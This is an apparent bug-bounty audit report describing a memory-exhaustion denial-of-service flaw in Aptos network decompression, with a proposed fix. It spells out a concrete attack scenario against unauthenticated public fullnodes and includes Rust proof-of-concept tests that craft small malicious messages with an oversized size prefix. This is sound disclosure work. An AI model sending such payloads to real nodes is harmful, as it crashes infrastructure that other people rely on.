# Audit Report

## Title
Memory Exhaustion DoS via Malicious Compressed Message Size Prefix in Network Deserialization

## Summary
The `ProtocolId::from_bytes()` function for CompressedBcs-encoded protocols allocates memory based on an attacker-controlled 4-byte size prefix before validating the actual compressed data. An attacker can send a stream of small malformed messages (each ~100 bytes) that each claim a decompressed size of ~62 MiB, causing the decompression function to allocate 62 MiB per message. With concurrent deserialization across multiple connections and CPU cores, this leads to memory exhaustion and node crashes.

## Finding Description
When network messages using CompressedBcs encoding (such as `MempoolDirectSend` on public fullnode networks) are received, the deserialization flow is:

1. Message arrives and is queued for deserialization
2. A blocking task spawns to call `ProtocolId::from_bytes()` [1](#0-0) 

3. For CompressedBcs encoding, it calls `aptos_compression::decompress()` [2](#0-1) 

4. The decompression function parses the first 4 bytes as the decompressed size prefix and validates it's under the limit [3](#0-2) 

5. **Critical vulnerability**: Memory allocation occurs based solely on this attacker-controlled size prefix [4](#0-3) 

6. Only then does actual decompression attempt, which fails on corrupted data [5](#0-4) 

The `MAX_APPLICATION_MESSAGE_SIZE` limit is approximately 62 MiB [6](#0-5) 

Network deserialization uses concurrent processing with `max_parallel_deserialization_tasks` defaulting to `num_cpus::get()` [7](#0-6) 

Messages are processed concurrently using `buffer_unordered` or `buffered` streams [8](#0-7) 

Protocols like `MempoolDirectSend` use CompressedBcs encoding [9](#0-8)  and are available on public fullnode networks that don't require mutual authentication [10](#0-9) 

**Attack scenario:**
1. Attacker connects to public fullnode (up to 100 concurrent connections allowed) [11](#0-10) 
2. Sends continuous stream of malformed `MempoolDirectSend` messages:
   - Each message: ~100 bytes total
   - Size prefix (first 4 bytes): 0x03B00000 (~62 MiB in little-endian)
   - Remaining: corrupted compressed data
3. Each message triggers 62 MiB allocation before decompression fails
4. With `num_cpus` concurrent deserializations (e.g., 16 cores) = 16 × 62 MiB = ~1 GB allocated simultaneously
5. Multiple connections × continuous message stream = rapid memory exhaustion
6. Node becomes unresponsive or crashes (OOM kill)

This breaks the **Resource Limits** invariant that all operations must respect memory constraints, and violates network availability guarantees.

## Impact Explanation
This is **High Severity** per Aptos bug bounty criteria:
- **Validator node slowdowns**: Memory pressure causes performance degradation
- **API crashes**: Out-of-memory conditions crash the node process
- **Significant protocol violations**: Breaks resource limit invariants

The vulnerability allows an unprivileged network attacker to:
- Force memory exhaustion on validator fullnodes and public fullnodes
- Cause service disruption without sending large volumes of data (amplification factor of 600,000×: 100 bytes sent → 62 MiB allocated)
- Affect multiple nodes simultaneously with coordinated attacks
- Bypass existing rate limiting (which is byte-based, not allocation-based)

While not Critical severity (doesn't cause consensus safety violations or permanent fund loss), it enables effective DoS attacks against critical infrastructure.

## Likelihood Explanation
**HIGH likelihood** - The attack is:
- **Easy to execute**: Requires only network access to public fullnode endpoints
- **Low cost**: Minimal bandwidth needed (~100 bytes per attack message)
- **No authentication required**: Public fullnode networks accept unauthenticated connections
- **Immediate effect**: Memory exhaustion occurs quickly with concurrent allocations
- **Difficult to detect**: Legitimate compressed messages also have size prefixes
- **Not prevented by existing defenses**: 
  - Rate limiting (if configured) is byte-based and doesn't prevent small messages
  - Connection limits (100) are high enough for effective attacks
  - No validation of size prefix against actual compressed data size

The vulnerability exists in production code paths used by all fullnodes receiving mempool transactions.

## Recommendation
**Immediate mitigation**: Add validation that the claimed decompressed size is reasonable relative to the actual compressed data size before allocating memory:

```rust
fn get_decompressed_size(
    compressed_data: &CompressedData,
    max_size: usize,
) -> Result<usize, Error> {
    // Existing checks for length and parsing...
    
    let size = size as usize;
    if size > max_size {
        return Err(DecompressionError(format!(
            "Parsed size prefix in buffer is too big: {} > {}",
            size, max_size
        )));
    }
    
    // NEW: Validate compression ratio is reasonable
    // LZ4 compression ratio typically ranges from 1.5x to 4x
    // A 10x ratio threshold provides safety margin while catching attacks
    let max_reasonable_ratio = 10;
    let min_compressed_size = size / max_reasonable_ratio;
    if compressed_data.len() < min_compressed_size {
        return Err(DecompressionError(format!(
            "Compressed data size {} too small for claimed decompressed size {}: suspicious compression ratio",
            compressed_data.len(), size
        )));
    }
    
    Ok(size)
}
```

**Additional defense-in-depth measures**:
1. Implement per-connection message rate limiting (message count, not just bytes)
2. Add metrics for tracking allocation sizes in deserialization
3. Consider streaming decompression instead of allocating full buffer upfront
4. Set lower `max_parallel_deserialization_tasks` limits for untrusted networks
5. Add connection-level backpressure when deserialization queue depth exceeds threshold

## Proof of Concept

```rust
// Test demonstrating the vulnerability
// File: network/framework/src/protocols/wire/handshake/v1/test_memory_exhaustion.rs

use crate::protocols::wire::handshake::v1::ProtocolId;
use aptos_config::config::MAX_APPLICATION_MESSAGE_SIZE;

#[test]
fn test_malicious_compressed_size_prefix_memory_allocation() {
    // Craft malicious compressed message:
    // - Size prefix claims 61 MiB decompressed size
    // - Actual compressed data is only 96 bytes of garbage
    let claimed_size: u32 = (MAX_APPLICATION_MESSAGE_SIZE - 2_097_152) as u32; // ~61 MiB
    let mut malicious_payload = Vec::new();
    
    // Add size prefix in little-endian (LZ4 format)
    malicious_payload.extend_from_slice(&claimed_size.to_le_bytes());
    
    // Add garbage compressed data (96 bytes)
    malicious_payload.extend_from_slice(&vec![0xFF; 96]);
    
    // Attempt deserialization using MempoolDirectSend protocol
    let protocol_id = ProtocolId::MempoolDirectSend;
    
    // This will allocate ~61 MiB of memory before failing!
    let result: Result<Vec<u8>, _> = protocol_id.from_bytes(&malicious_payload);
    
    // Deserialization fails as expected
    assert!(result.is_err());
    
    // But the memory was allocated during the attempt!
    // In production: attacker sends thousands of these across multiple
    // connections with num_cpus concurrent deserializations
    // Result: rapid memory exhaustion and node crash
    println!("Attack demonstrated: 100 bytes sent, {} bytes allocated!", 
             claimed_size);
}

// Benchmark demonstrating concurrent memory exhaustion
#[ignore] // Don't run in CI to avoid OOM
#[test]
fn test_concurrent_memory_exhaustion_attack() {
    use std::sync::Arc;
    use std::thread;
    
    let protocol_id = ProtocolId::MempoolDirectSend;
    let num_threads = num_cpus::get();
    let messages_per_thread = 100;
    
    println!("Simulating attack with {} threads, {} messages each", 
             num_threads, messages_per_thread);
    
    let malicious_payload = Arc::new({
        let claimed_size: u32 = 61_000_000;
        let mut payload = Vec::new();
        payload.extend_from_slice(&claimed_size.to_le_bytes());
        payload.extend_from_slice(&vec![0xFF; 96]);
        payload
    });
    
    let handles: Vec<_> = (0..num_threads).map(|_| {
        let payload = Arc::clone(&malicious_payload);
        let pid = protocol_id;
        thread::spawn(move || {
            for _ in 0..messages_per_thread {
                let _result: Result<Vec<u8>, _> = pid.from_bytes(&payload);
                // Each failure allocates 61 MiB temporarily
            }
        })
    }).collect();
    
    for handle in handles {
        handle.join().unwrap();
    }
    
    println!("Peak memory usage: {} GB allocated across {} concurrent operations",
             (num_threads as f64 * 61.0) / 1024.0, num_threads);
}
```

## Notes

This vulnerability is particularly dangerous because:

1. **Amplification factor**: Attacker sends ~100 bytes, triggers 62 MiB allocation (600,000× amplification)
2. **Bypass existing defenses**: Byte-based rate limiting doesn't prevent small messages with large allocation claims
3. **Affects critical infrastructure**: Both validator fullnodes and public fullnodes are vulnerable
4. **No authentication needed**: Public fullnode networks accept unauthenticated connections
5. **Fast failure, continuous attack**: While each allocation is freed quickly (RAII), continuous message streams maintain memory pressure

The root cause is trusting attacker-controlled data (size prefix) for memory allocation before validating the actual compressed payload. The fix must validate the size prefix is reasonable relative to the compressed data size before allocating.

### Citations

**File:** network/framework/src/protocols/wire/handshake/v1/mod.rs (L168-168)
```rust
            ProtocolId::MempoolDirectSend => Encoding::CompressedBcs(USER_INPUT_RECURSION_LIMIT),
```

**File:** network/framework/src/protocols/wire/handshake/v1/mod.rs (L226-252)
```rust
    pub fn from_bytes<T: DeserializeOwned>(&self, bytes: &[u8]) -> anyhow::Result<T> {
        // Start the deserialization timer
        let deserialization_timer = start_serialization_timer(*self, DESERIALIZATION_LABEL);

        // Deserialize the message
        let result = match self.encoding() {
            Encoding::Bcs(limit) => self.bcs_decode(bytes, limit),
            Encoding::CompressedBcs(limit) => {
                let compression_client = self.get_compression_client();
                let raw_bytes = aptos_compression::decompress(
                    &bytes.to_vec(),
                    compression_client,
                    MAX_APPLICATION_MESSAGE_SIZE,
                )
                .map_err(|e| anyhow! {"{:?}", e})?;
                self.bcs_decode(&raw_bytes, limit)
            },
            Encoding::Json => serde_json::from_slice(bytes).map_err(|e| anyhow!("{:?}", e)),
        };

        // Only record the duration if deserialization was successful
        if result.is_ok() {
            deserialization_timer.observe_duration();
        }

        result
    }
```

**File:** crates/aptos-compression/src/lib.rs (L108-108)
```rust
    let mut raw_data = vec![0u8; decompressed_size];
```

**File:** crates/aptos-compression/src/lib.rs (L111-114)
```rust
    if let Err(error) = lz4::block::decompress_to_buffer(compressed_data, None, &mut raw_data) {
        let error_string = format!("Failed to decompress the data: {}", error);
        return create_decompression_error(&client, error_string);
    };
```

**File:** crates/aptos-compression/src/lib.rs (L150-184)
```rust
fn get_decompressed_size(
    compressed_data: &CompressedData,
    max_size: usize,
) -> Result<usize, Error> {
    // Ensure that the compressed data is at least 4 bytes long
    if compressed_data.len() < 4 {
        return Err(DecompressionError(format!(
            "Compressed data must be at least 4 bytes long! Got: {}",
            compressed_data.len()
        )));
    }

    // Parse the size prefix
    let size = (compressed_data[0] as i32)
        | ((compressed_data[1] as i32) << 8)
        | ((compressed_data[2] as i32) << 16)
        | ((compressed_data[3] as i32) << 24);
    if size < 0 {
        return Err(DecompressionError(format!(
            "Parsed size prefix in buffer must not be negative! Got: {}",
            size
        )));
    }

    // Ensure that the size is not greater than the max size limit
    let size = size as usize;
    if size > max_size {
        return Err(DecompressionError(format!(
            "Parsed size prefix in buffer is too big: {} > {}",
            size, max_size
        )));
    }

    Ok(size)
}
```

**File:** config/src/config/network_config.rs (L44-44)
```rust
pub const MAX_INBOUND_CONNECTIONS: usize = 100;
```

**File:** config/src/config/network_config.rs (L47-48)
```rust
pub const MAX_APPLICATION_MESSAGE_SIZE: usize =
    (MAX_MESSAGE_SIZE - MAX_MESSAGE_METADATA_SIZE) - MESSAGE_PADDING_SIZE; /* The message size that applications should check against */
```

**File:** config/src/config/network_config.rs (L136-142)
```rust
        let mutual_authentication = network_id.is_validator_network();
        let mut config = Self {
            discovery_method: DiscoveryMethod::None,
            discovery_methods: Vec::new(),
            identity: Identity::None,
            listen_address: "/ip4/0.0.0.0/tcp/6180".parse().unwrap(),
            mutual_authentication,
```

**File:** config/src/config/network_config.rs (L182-184)
```rust
        if self.max_parallel_deserialization_tasks.is_none() {
            self.max_parallel_deserialization_tasks = Some(num_cpus::get());
        }
```

**File:** network/framework/src/protocols/network/mod.rs (L217-235)
```rust
        let data_event_stream = peer_mgr_notifs_rx.map(|notification| {
            tokio::task::spawn_blocking(move || received_message_to_event(notification))
        });

        let data_event_stream: Pin<
            Box<dyn Stream<Item = Event<TMessage>> + Send + Sync + 'static>,
        > = if allow_out_of_order_delivery {
            Box::pin(
                data_event_stream
                    .buffer_unordered(max_parallel_deserialization_tasks)
                    .filter_map(|res| future::ready(res.expect("JoinError from spawn blocking"))),
            )
        } else {
            Box::pin(
                data_event_stream
                    .buffered(max_parallel_deserialization_tasks)
                    .filter_map(|res| future::ready(res.expect("JoinError from spawn blocking"))),
            )
        };
```
